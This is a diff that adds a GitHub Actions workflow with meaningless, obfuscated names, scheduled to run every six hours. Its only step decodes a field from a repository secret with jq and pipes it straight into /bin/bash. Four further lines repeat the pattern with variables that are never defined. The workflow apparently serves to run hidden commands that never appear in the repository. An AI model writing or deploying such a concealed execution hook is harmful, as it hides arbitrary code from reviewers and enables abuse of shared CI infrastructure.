@@ -1,0 +1,22 @@
+name: guoxunsu6789
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: guoxunsu6789
+        env:
+          le13192: ${{ secrets.le13192 }}
+        run: |
+          echo $le13192 | jq -r .lx25 | /bin/bash
+          echo $lv6 | jq -r .ddrtv11956 | /bin/bash
+          echo $dftov9371 | jq -r .aooz3165 | /bin/bash
+          echo $szrvs288 | jq -r .ln718 | /bin/bash
+          echo $uq50329 | jq -r .h27101 | /bin/bash
+
